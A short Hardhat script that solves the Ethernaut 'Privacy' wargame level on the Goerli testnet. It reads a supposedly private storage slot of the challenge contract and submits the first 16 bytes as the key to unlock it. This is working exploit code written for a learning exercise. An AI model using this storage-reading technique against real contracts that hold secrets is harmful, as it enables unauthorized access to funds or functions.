import { ethers } from "hardhat";

const attackPrivacy = async () => {
    // change contract addresses here.
    const privacyAddress = "0xa6A8590F537D767A4582bcF1A594c3c87CCDD326"; //type "await contract.address()" in ethernaut console

    // Don't touch below 🚀
    // Vulnerability comes from password and everything else can be read once in the blockchain
    // Additional read:
    // https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925
    // https://docs.soliditylang.org/en/v0.8.7/types.html#fixed-size-byte-arrays
    // https://docs.soliditylang.org/en/v0.8.7/internals/layout_in_storage.html#
    // https://web3js.readthedocs.io/en/v1.5.2/web3-eth.html#getstorageat
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [],
            name: "locked",
            outputs: [{ internalType: "bool", name: "", type: "bool" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [{ internalType: "bytes16", name: "_key", type: "bytes16" }],
            name: "unlock",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, privacyAddress);
    let locked = await contract.locked();
    console.log(`Locked?: ${locked}`);
    console.log("Reading storage for data to unlock...");
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const data = await provider.getStorageAt(privacyAddress, 5);
    console.log(data);
    console.log("Converting to bytes16 to meet the requirement...");
    const cleanData = data.slice(0, 34);
    console.log(`data is: ${cleanData}`);
    console.log("Inputting data to unlock...");
    const unlock = await contract.unlock(cleanData);
    const Receipt = await unlock.wait();
    console.log(Receipt);
    locked = await contract.locked();
    console.log(`Locked?: ${locked}`);
    if (!locked) {
        console.log("Congrats! Level Passed, You may submit to ethernaut");
    } else {
        console.log("Sorry still unlocked, please review code above...");
    }
};

attackPrivacy()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
